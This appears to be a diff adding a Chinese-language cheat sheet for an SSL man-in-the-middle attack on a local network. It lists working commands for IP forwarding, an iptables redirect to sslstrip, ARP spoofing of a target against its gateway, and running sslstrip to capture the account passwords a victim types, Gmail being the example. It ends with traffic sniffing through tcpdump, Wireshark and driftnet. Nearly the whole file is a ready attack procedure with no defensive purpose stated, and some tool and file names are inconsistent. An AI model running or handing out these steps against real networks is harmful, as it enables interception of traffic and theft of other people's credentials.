@@ -1,0 +1,57 @@
+SSL中間人攻擊
+
+sslstrip:
+sudo apt-get install sslstrip
+
+===============================
+端口轉發
+===============================
+echo 1 > /proc/sys/net/ipv4/ip_forward
+
+設置
+iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+取消
+iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
+
+查看轉發表
+iptables -t nat -L
+
+刪除轉發表
+iptables -t nat -D PREROUTING 1
+
+查找網關IP
+netstat -nr
+
+===============================
+ARP欺騙
+===============================
+用法: arpspoof -i <interface> -t <target IP> <gateway Ip>
+arpspoof -i wlan0 -t 192.168.2.13 192.168.1.1
+或
+arpspoof -i eth0 -t 192.168.1.110 192.168.1.1
+
+================================
+SSL 劫持
+================================
+sslstrip -p -l 10000 -w sslstrip-log.txt
+
+打開瀏覽器 www.gmail.com 輸入帳戶密碼
+
+將看到sslstrip捕獲一些數據 按 ctrl+C 停止 sslstrip
+數據自動保存在名為sslstrip.log.txt的文件中。
+使用 cat 查看 sslstrip.log.txt
+cat sslstrip.log.txt
+
+
+================================
+流量監控
+================================
+1. tcpdump
+
+2. wireshark
+
+3. drafnet
+
+driftnet -i <LAN>
+# driftnet -i eth0
+
